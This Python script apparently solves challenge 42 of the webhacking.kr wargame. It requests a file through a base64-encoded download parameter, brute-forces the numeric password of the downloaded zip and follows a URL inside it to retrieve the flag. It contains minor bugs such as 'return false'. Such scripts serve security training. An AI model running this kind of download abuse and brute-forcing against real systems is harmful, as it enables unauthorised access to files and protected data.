import re
import requests
from requests import get
import zipfile
import urllib.request
import os

# 세션 값
PHPSESSID = ""
URL = "http://webhacking.kr/challenge/web/web-20/index.php"
DOWN_LOAD_PARAM = '?down=dGVzdC56aXA='

cookies = {
    'PHPSESSID' : PHPSESSID
}

if os.name == 'nt':
    import ctypes
    from ctypes import windll, wintypes
    from uuid import UUID

    # ctypes GUID copied from MSDN sample code
    class GUID(ctypes.Structure):
        _fields_ = [
            ("Data1", wintypes.DWORD),
            ("Data2", wintypes.WORD),
            ("Data3", wintypes.WORD),
            ("Data4", wintypes.BYTE * 8)
        ]

        def __init__(self, uuidstr):
            uuid = UUID(uuidstr)
            ctypes.Structure.__init__(self)
            self.Data1, self.Data2, self.Data3, \
                self.Data4[0], self.Data4[1], rest = uuid.fields
            for i in range(2, 8):
                self.Data4[i] = rest>>(8-i-1)*8 & 0xff

    SHGetKnownFolderPath = windll.shell32.SHGetKnownFolderPath
    SHGetKnownFolderPath.argtypes = [
        ctypes.POINTER(GUID), wintypes.DWORD,
        wintypes.HANDLE, ctypes.POINTER(ctypes.c_wchar_p)
    ]

    def _get_known_folder_path(uuidstr):
        pathptr = ctypes.c_wchar_p()
        guid = GUID(uuidstr)
        if SHGetKnownFolderPath(ctypes.byref(guid), 0, 0, ctypes.byref(pathptr)):
            raise ctypes.WinError()
        return pathptr.value

    FOLDERID_Download = '{374DE290-123F-4565-9164-39C4925E467B}'

    def get_download_folder():
        return _get_known_folder_path(FOLDERID_Download)
else:
    def get_download_folder():
        home = os.path.expanduser("~")
        return os.path.join(home, "Downloads")

def findPassword(password,targetPath):

    # print(targetPath)
    # with ZipFile(targetPath) as zf

    targetFile = targetPath + '/test.zip'
    zipFile = zipfile.ZipFile(targetFile)
    solvedPassword = None

    try:
        # 아스키로 치환해야했능가...
        # https://stackoverflow.com/questions/32074883/escape-exclamation-mark-python
        zipFile.extractall(path = targetPath, pwd=str(password).encode('ascii'))
        solvedPassword = password
    except:
        pass

    return solvedPassword

def main():
    print(
        """
        +------------------------------------------------------+
        |         { webhacking.kr 42 challenge }               |
        |  Created By      : a@hax0r.info (Woo YoungJun)       |
        |  Blog            : blog.hax0r.info                   |
        |  Repository      : github.com/webhacking/War-games   |
        +------------------------------------------------------+ 
        """
    )

    response = requests.post(URL + DOWN_LOAD_PARAM, cookies=cookies)
    fileDirectUrl = ', '.join(re.findall(r'href=[\'"]?([^\'" >]+)', response.text))

    if fileDirectUrl:
        print('Find your file direct link')
        print('Start down load origin is ' + URL.replace('index.php', '') + fileDirectUrl)

        downloadPath = get_download_folder() + '/webhacking42'

        if not os.path.exists(downloadPath):
            os.makedirs(downloadPath)

        print('Here is your download path ' + downloadPath + '/test.zip')
        urllib.request.urlretrieve(URL.replace('index.php', '') + fileDirectUrl, downloadPath + '/test.zip')

        print('And then we are figure out this zip file password')

        # 문제가 기재(test.zip password is only numbers) 되었 듯, 숫자형으로 알고 최소값과 최대값을 정의하여 패스워드를 알아보자
        for i in range(0, 1995):
            filePassword = findPassword(i, downloadPath)

            if filePassword is not None :
                print('Find zip file password is : ' + str(filePassword))

        lastKey = ''
        for root, dirs, files in os.walk(downloadPath):
            for file in files:
                if file.endswith(".txt"):
                    with open(os.path.join(root, file), 'r') as myfile:
                        lastKey = myfile.read().replace('\n', '')
        if lastKey is '' :
            print("Can't readed last key TT..")
            return false

        lastKeyResponse = requests.get(lastKey, cookies=cookies)

        print('Find your last auth key ! See the below')
        print(lastKeyResponse.text.split('Password is')[1].replace(' ',''))

if __name__ == '__main__':
	main()